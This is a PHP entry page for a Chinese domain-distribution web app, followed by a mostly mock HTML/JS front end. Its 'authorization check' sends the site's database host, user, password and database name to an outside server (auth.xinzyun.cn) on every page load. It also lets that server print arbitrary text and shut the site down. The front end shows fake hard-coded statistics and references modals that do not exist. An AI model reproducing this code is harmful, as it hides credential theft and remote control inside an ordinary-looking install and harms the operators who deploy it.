<?php
// 检查是否已安装
function checkInstallStatus() {
    return file_exists('install.lock');
}

if (!checkInstallStatus()) {
    header('Location: install/index.php');
    exit();
}

// 加载数据库配置
$oreoconfig = require __DIR__ . '/application/config/database.php';

// 授权检测函数
function OreoClass($oreoconfig) {
    error_reporting(0);
    function getTopDomainhuo() {
        $host = $_SERVER['HTTP_HOST'];
        $str = ''; // 原代码中 $str 未定义，这里暂时留空
        $matchstr = "[^\.]+\.(?:(" . $str . ")|\\w{2}|((" . $str . ")\\.\\w{2}))$";
        if (preg_match("/" . $matchstr . "/ies", $host, $matchs)) {
            $domain = $matchs[0];
        } else {
            $domain = $host;
        }
        return $domain;
    }
    $authid = "30a483fac6ae5f38"; // 这里=后面的字符是在设置授权程序页面配置程序后生成的系统验证码
    $domain = getTopDomainhuo();
    $real_domain = 'baidu.com'; // 本地检查时 用户的授权域名 和时间
    $check_host = 'http://auth.xinzyun.cn/oreo_look.php';  // http://后是您的域名.
    $oreo_check = $check_host . '?a=client_check&u=' . $_SERVER['HTTP_HOST'] . '&authid=' . $authid . '&sysnum=' . $authid . '&host=' . $oreoconfig['host'] . '&port=' . $oreoconfig['port'] . '&user=' . $oreoconfig['user'] . '&pwd=' . $oreoconfig['pwd'] . '&dbname=' . $oreoconfig['dbname'];
    $check_message = $check_host . '?a=check_message&u=' . $_SERVER['HTTP_HOST'] . '&authid=' . $authid . '&sysnum=' . $authid . '&host=' . $oreoconfig['host'] . '&port=' . $oreoconfig['port'] . '&user=' . $oreoconfig['user'] . '&pwd=' . $oreoconfig['pwd'] . '&dbname=' . $oreoconfig['dbname'];
    $oreo_info = @file_get_contents($oreo_check);
    $oreo_message = @file_get_contents($check_message);
    if ($oreo_info == '1') {
        echo $oreo_message;
        die;
    } elseif ($oreo_info == '2') {
        echo $oreo_message;
        die;
    } elseif ($oreo_info == '3') {
        echo $oreo_message;
        die;
    } elseif ($oreo_info == '4') {
        echo $oreo_message;
        die;
    }
    if ($oreo_info!== '0') { // 远程检查失败的时候 本地检查
        if ($domain!== $real_domain) {
            echo '远程检查失败了。请联系授权提供商QQ:609451870。';
            die;
        }
    }
    unset($domain);
}

// 执行授权检测
$oreosq = OreoClass($oreoconfig);
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>域名分发系统 - DNS 分发管理平台</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- 导航栏 -->
        <div class="navbar">
            <div class="logo-small">
                <h2>域名分发系统</h2>
            </div>
            <div class="nav-links">
                <button class="nav-btn login-btn" id="loginBtn">登录</button>
                <button class="nav-btn register-btn" id="registerBtn">注册</button>
            </div>
        </div>

        <header>
            <div class="logo">
                <h1>域名分发系统</h1>
                <p>高效管理您的域名分发</p>
            </div>
        </header>
        
        <main>
            <div class="card">
                <h2>域名分发</h2>
                <form id="domainForm">
                    <div class="form-group" style="display: flex; gap: 10px;">
                        <div style="flex: 1;">
                            <label for="domain">输入域名</label>
                            <input type="text" id="domain" name="domain" placeholder="例如: example.com" required>
                        </div>
                        <div style="flex: 0 0 150px;">
                            <label for="domainSelect">选择域名</label>
                            <select id="domainSelect" name="domainSelect">
                                <option value="">选择预设域名</option>
                                <option value="example.com">example.com</option>
                                <option value="test.org">test.org</option>
                                <option value="app.net">app.net</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="destination">目标服务器</label>
                        <select id="destination" name="destination" required>
                            <option value="">选择目标服务器</option>
                            <option value="server1">服务器 1</option>
                            <option value="server2">服务器 2</option>
                            <option value="server3">服务器 3</option>
                            <option value="custom">自定义服务器</option>
                        </select>
                    </div>
                    <div class="form-group custom-server" id="customServerGroup" style="display: none;">
                        <label for="customServer">自定义服务器 IP</label>
                        <input type="text" id="customServer" name="customServer" placeholder="例如: 192.168.1.1">
                    </div>
                    <button type="submit" class="btn-primary">分发域名</button>
                </form>
            </div>
            
            <div class="system-info">
                <div class="info-card">
                    <h3>系统信息</h3>
                    <p>版本: 2.1.0</p>
                    <p>最后更新: 2023-11-15</p>
                    <p>状态: 运行正常</p>
                </div>
                <div class="info-card">
                    <h3>最近操作</h3>
                    <p>example.com → 服务器 2 (10分钟前)</p>
                    <p>test.org → 服务器 1 (30分钟前)</p>
                    <p>app.net → 服务器 3 (2小时前)</p>
                </div>
            </div>
            
            <div class="card stats">
                <h2>系统状态</h2>
                <div class="stats-grid">
                    <div class="stat-item">
                        <h3>总域名</h3>
                        <p class="stat-number">1,245</p>
                    </div>
                    <div class="stat-item">
                        <h3>活跃域名</h3>
                        <p class="stat-number">876</p>
                    </div>
                    <div class="stat-item">
                        <h3>服务器数量</h3>
                        <p class="stat-number">12</p>
                    </div>
                    <div class="stat-item">
                        <h3>今日请求</h3>
                        <p class="stat-number">2,458</p>
                    </div>
                </div>
            </div>
        </main>
        
        <footer>
            <p>&copy; 2023 域名分发系统 | DNS 分发管理平台</p>
        </footer>
    </div>

    <script>
        // 显示/隐藏自定义服务器输入框
        document.getElementById('destination').addEventListener('change', function() {
            const customServerGroup = document.getElementById('customServerGroup');
            if (this.value === 'custom') {
                customServerGroup.style.display = 'block';
            } else {
                customServerGroup.style.display = 'none';
            }
        });

        // 显示弹窗
        function showModal(message) {
            const modal = document.getElementById('successModal');
            const modalMessage = document.getElementById('modalMessage');
            modalMessage.textContent = message;
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.classList.add('show');
            }, 10);
        }

        // 关闭弹窗
        function hideModal(modalId) {
            const modal = document.getElementById(modalId);
            modal.classList.remove('show');
            setTimeout(() => {
                modal.style.display = 'none';
            }, 300);
        }

        document.getElementById('closeModal').addEventListener('click', function() {
            hideModal('successModal');
        });

        // 表单提交处理
        document.getElementById('domainForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const domain = document.getElementById('domain').value;
            const destination = document.getElementById('destination').value;
            const customServer = document.getElementById('customServer').value;
            
            // 模拟分发成功
            let message = `域名 ${domain} 已成功分发到 ${destination === 'custom' ? customServer : destination}`;
            showModal(message);
        });

        // 登录弹窗
        document.getElementById('loginBtn').addEventListener('click', function() {
            const modal = document.getElementById('loginModal');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.classList.add('show');
            }, 10);
        });

        document.getElementById('closeLoginModal').addEventListener('click', function() {
            hideModal('loginModal');
        });

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('登录功能正在开发中，请等待...');
            hideModal('loginModal');
        });

        // 注册弹窗
        document.getElementById('registerBtn').addEventListener('click', function() {
            const modal = document.getElementById('registerModal');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.classList.add('show');
            }, 10);
        });

        document.getElementById('closeRegisterModal').addEventListener('click', function() {
            hideModal('registerModal');
        });

        document.getElementById('registerForm').addEventListener('submit', function(e) {
            e.preventDefault();
            alert('注册功能正在开发中，请等待...');
            hideModal('registerModal');
        });

        // 选择域名下拉框
        document.getElementById('domainSelect').addEventListener('change', function() {
            document.getElementById('domain').value = this.value;
        });
    </script>
</body>
</html>